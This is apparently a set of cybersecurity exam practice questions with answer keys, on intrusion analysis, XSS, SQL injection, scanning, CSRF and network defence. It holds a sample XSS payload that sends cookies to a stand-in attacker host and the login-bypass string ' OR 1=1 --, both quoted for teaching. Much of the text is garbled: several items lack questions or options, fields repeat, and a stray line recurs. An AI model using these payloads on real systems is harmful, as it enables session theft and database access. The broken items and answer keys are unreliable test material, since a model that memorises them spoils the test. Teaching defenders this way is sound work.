    "question": "You are analyzing a network intrusion and have identified a suspicious process on a compromised Linux server.  You suspect the process may be communicating with a command-and-control (C2) server. Which of the following commands, and specific options, would provide the MOST comprehensive and efficient way to list *all* open network connections, including the associated process ID (PID), program name, connection state, and local and remote addresses, and then filter that output to show only connections involving a specific suspected C2 IP address (e.g., 198.51.100.25)?",
 "options":[
    "netstat -an | grep 198.51.100.25",
  "ss -tupn | grep 198.51.100.25",
    "lsof -i | grep 198.51.100.25",
     "tcpdump -i eth0 host 198.51.100.25"
 ],
   "correctAnswerIndex": 1,
    "explanation":
   "`netstat -an` is deprecated on many modern Linux systems and may not reliably show program names or all connection types. `lsof -i` is powerful for listing open files (including network sockets), but is less directly focused on providing a comprehensive, easily filtered view of *current* network connections with all relevant details. `tcpdump` is a packet capture tool; it's invaluable for deep packet inspection, but it doesn't provide a summarized view of established connections and associated processes. `ss -tupn | grep 198.51.100.25` is the BEST option. `ss` is the modern replacement for `netstat` and provides more detailed and reliable information. The options provide:
    *   `-t`: Show TCP sockets.
    *   `-u`: Show UDP sockets.
      *   `-p`: Show the process ID (PID) and program name associated with each socket.
    *   `-n`: Show numerical addresses instead of resolving hostnames (faster and avoids potential DNS issues).
     *   `-l` Show listening sockets.
      * `-n` shows numerical addresses instead of trying to resolve, which is much faster

Piping the output to `grep 198.51.100.25` efficiently filters the results to show only connections involving the suspected C2 IP address.",
   "examTip": "`ss -tupn` is the preferred command on modern Linux systems for detailed network connection information; combine it with `grep` for efficient filtering."

     "question": "A web server's access logs show repeated requests similar to this:

     GET /search.php?term=<script>window.location='http://attacker.com/?c='+document.cookie</script> HTTP/1.1

     What type of attack is being attempted, what is the attacker's likely goal, and which specific vulnerability in the web application makes this attack possible?",
    "options": [
   "SQL Injection; the attacker is trying to modify database queries; vulnerability is improper input validation in database queries.",
  "Cross-Site Scripting (XSS); the attacker is trying to steal user cookies and redirect them to a malicious site; vulnerability is insufficient output encoding.",
    "Cross-Site Request Forgery (CSRF); the attacker is trying to force users to perform actions they didn't intend; vulnerability is lack of anti-CSRF tokens.",
     "Denial-of-Service (DoS); the attacker is trying to overwhelm the server with requests; vulnerability is lack of rate limiting."
 ],
 "correctAnswerIndex": 1,
 "explanation":
   "The injected code is JavaScript, not SQL. CSRF involves forcing actions, not injecting scripts. DoS aims to disrupt service, not steal data. This is a classic example of a *reflected cross-site scripting (XSS)* attack. The attacker is injecting a malicious JavaScript snippet into the `term` parameter of the `search.php` page. If the application doesn't properly *sanitize* or *encode* user input *before* displaying it back to the user (or other users), the injected script will be *executed by the victim's browser*. In this case, the script attempts to redirect the user to `http://attacker.com/?c='+document.cookie`, sending the user's cookies to the attacker's server. The attacker can then use these cookies to hijack the user's session. The core vulnerability is *insufficient output encoding/escaping* (and potentially insufficient input validation as well).",

  "explanation":
   "This is not XSS (which involves injecting scripts into a *vulnerable website*), SQL injection (which targets databases), or a brute-force attack (which involves guessing passwords). This is a classic *phishing* attack. The attacker is using *social engineering* (impersonating a trusted service) to trick the user into revealing their credentials. While *security awareness training* is crucial to educate users about phishing, the most effective *technical* control to mitigate this *specific threat* is *multi-factor authentication (MFA)*. Even if the attacker obtains the user's password through the phishing site, they *won't be able to access the account* without the second authentication factor (e.g., a one-time code from a mobile app, a biometric scan, a security key).",

   "question": "You are analyzing a PCAP file and observe a large number of TCP SYN packets sent to various ports on a target system, with no corresponding SYN-ACK responses from the target.  What type of scan is MOST likely being performed, and what is its purpose?",
"options":[
   "A full connect scan; to establish complete TCP connections with the target.",
     "A SYN scan (half-open scan); to identify open ports on the target while minimizing detection.",
    "An XMAS scan; to identify the operating system of the target.",
    "A NULL scan; to bypass firewall rules."
  ],
   "correctAnswerIndex": 1,
"explanation":
    "A *full connect scan* completes the three-way handshake (SYN, SYN-ACK, ACK). An XMAS scan and NULL scan use different TCP flag combinations. The described scenario – sending *only SYN packets* and *not completing the handshake* – is characteristic of a *SYN scan* (also known as a *half-open scan* or *stealth scan*). The attacker sends a SYN packet to each target port. If the port is *open*, the target will respond with a SYN-ACK packet. If the port is *closed*, the target will respond with an RST (reset) packet. The attacker *doesn't* send the final ACK packet to complete the connection. This makes the scan *faster* than a full connect scan and *less likely to be logged* by the target system (as a full connection isn't established). The purpose is to *identify open ports* on the target system, which can then be used to identify potential vulnerabilities.",

    "correctAnswerIndex": 1,
    "explanation":
     "Strong passwords are important generally, but don't *directly* prevent CSRF. HTTPS protects data *in transit*, but not the forged request itself. Awareness training is helpful, but not a primary technical control. The most effective defense against CSRF is a *combination* of:
      *   **Anti-CSRF tokens:** Unique, secret, unpredictable tokens generated by the server for each session (or even for each form) and included in HTTP requests (usually in hidden form fields). The server then *validates* the token on submission to ensure the request originated from the legitimate application and not from an attacker's site.
    *   **Origin and Referer Header Validation:** Checking the `Origin` and `Referer` headers in HTTP requests to verify that the request is coming from the expected domain (the application's own domain) and not from a malicious site.

   "Restoring from backups *before* preserving evidence could *overwrite* crucial forensic data. Notifying authorities and patching are important, but *not the first step*. Before taking *any* action that might alter the state of the compromised systems, the *absolute first priority* is to *preserve evidence*. This involves: creating *forensic images* (bit-for-bit copies) of the affected systems' storage devices; collecting relevant logs (system logs, application logs, network traffic captures); and documenting the *chain of custody* for all evidence.

     ],
     "correctAnswerIndex": 1,
     "explanation":
     "The `-ExecutionPolicy Bypass` flag *does not* encrypt the script, force administrator privileges, or prevent network access. The Windows PowerShell *execution policy* is a security feature that controls whether PowerShell can run scripts and load configuration files. It has several levels (e.g., Restricted, AllSigned, RemoteSigned, Unrestricted). The `-ExecutionPolicy Bypass` flag *temporarily overrides* the configured execution policy for that specific PowerShell instance, allowing *unsigned scripts* (scripts that are not digitally signed by a trusted publisher) to be executed.

   "explanation":
 "Sandboxing is not about deletion, encryption, or backups. A sandbox is a *virtualized, isolated environment* that is *separate* from the host operating system and network. It's used to *safely execute and analyze* potentially malicious files or code (e.g., suspicious email attachments, downloaded files, unknown executables) *without risking harm* to the production environment.

    "correctAnswerIndex": 1,
    "explanation":
    "Network segmentation *complements* firewalls and IDS, it doesn't replace them. It does *not* allow unrestricted access; it's the *opposite*. Encryption is a separate security control. Network segmentation involves dividing a network into smaller, isolated subnetworks (segments or zones), often using VLANs, firewalls, or other network devices. This *limits the lateral movement* of attackers. If one segment is compromised (e.g., a user's workstation), the attacker's access to other segments (e.g., servers containing sensitive data) is restricted, containing the breach and reducing the overall impact. It also allows for applying different security policies to different segments based on their sensitivity and risk.",

* Sandboxing: Executing suspicious files in an isolated environment to observe their behavior.
* Threat hunting: Proactively searching for hidden threats that may have bypassed existing security controls.

These techniques, often combined with advanced Endpoint Detection and Response (EDR) and Extended Detection and Response (XDR) solutions, provide the best chance of detecting unknown threats.",

"question": "A company's web application allows users to input search terms. An attacker enters the following search term:

' OR 1=1 --
Use code with caution.
What type of attack is MOST likely being attempted, and what is the attacker's goal?",
Use code with caution.
"options":[
"Cross-site scripting (XSS); to inject malicious scripts into the website.",
"SQL injection; to bypass authentication or retrieve all data from a database table.",
"Denial-of-service (DoS); to overwhelm the web server with requests.",
"Directory traversal; to access files outside the webroot directory."
],
"correctAnswerIndex": 1,
"explanation":
"The input contains SQL code, not JavaScript (XSS). DoS aims to disrupt service, not inject code. Directory traversal uses ../ sequences. This is a classic example of a SQL injection attack. The attacker is attempting to inject malicious SQL code into the web application's search query. The specific payload (' OR 1=1 --) is designed to:
* ': Close the original SQL string literal (if the application uses single quotes to enclose the search term).
* OR 1=1: Inject a condition that is always true.
* --: Comment out the rest of the original SQL query.

If the application is vulnerable, this injected code will modify the SQL query, potentially causing it to return *all rows* from the table (bypassing any intended filtering) or even allowing the attacker to bypass authentication if this query is part of a login process.",

"question": "Which of the following Linux commands would be MOST useful for examining the listening network ports on a system and identifying the processes associated with those ports?",
"options":[
"ps aux",
"netstat -tulnp (or ss -tulnp)",
"top",
"lsof -i"
],
"correctAnswerIndex": 1,
"explanation":
"ps aux shows running processes, but not their network connections. top provides a dynamic view of resource usage, but not detailed network information. lsof -i lists open files, including network sockets, but is less directly focused on listening ports than netstat or ss. netstat -tulnp (or its modern equivalent, ss -tulpn) is specifically designed to display network connections. The options provide:
* -t: Show TCP ports.
* -u: Show UDP ports.
* -l: Show only listening sockets (ports that are waiting for incoming connections).
* -n: Show numerical addresses (don't resolve hostnames, which is faster).
* -p: Show the process ID (PID) and program name associated with each socket.

This combination provides the most comprehensive and relevant information for identifying listening ports and their associated processes.",
"examTip": "netstat -tulnp (or ss -tulpn) is the preferred command for viewing listening ports and associated processes on Linux."

"question": "What is the primary purpose of using a 'demilitarized zone (DMZ)' in a network architecture?",
"options":[
"To store highly confidential internal data and applications in a secure location.",
"To provide a segmented network zone that hosts publicly accessible services (e.g., web servers, email servers) while isolating them from the internal network.",
"To create a secure virtual private network (VPN) connection for remote users to access internal resources.",
"To connect directly to the internet without any firewalls or security measures."
],
"correctAnswerIndex": 1,
"explanation":
"A DMZ is not for storing confidential data, creating VPNs, or bypassing security. A DMZ is a separate network segment that sits between the internal network (where sensitive data and systems reside) and the public internet. It hosts servers that need to be accessible from the outside (web servers, email servers, FTP servers, etc.). The DMZ provides a buffer zone: if a server in the DMZ is compromised, the attacker's access to the internal network is limited, protecting more sensitive assets. Firewalls are typically placed between the internet and the DMZ, and between the DMZ and the internal network, to control traffic flow.",
